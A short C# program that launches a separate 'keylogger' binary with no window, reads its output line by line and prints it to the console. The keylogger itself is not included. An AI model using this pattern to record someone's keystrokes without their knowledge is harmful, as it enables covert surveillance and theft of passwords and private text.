using System;
using System.Diagnostics;

namespace wanshitong
{
    class Program
    {
        static void Main(string[] args)
        {
            var proc = new Process 
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "keylogger/keylogger",
                    Arguments = "",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();
                // do something with line
                System.Console.WriteLine(line);
            }
        }
    }
}
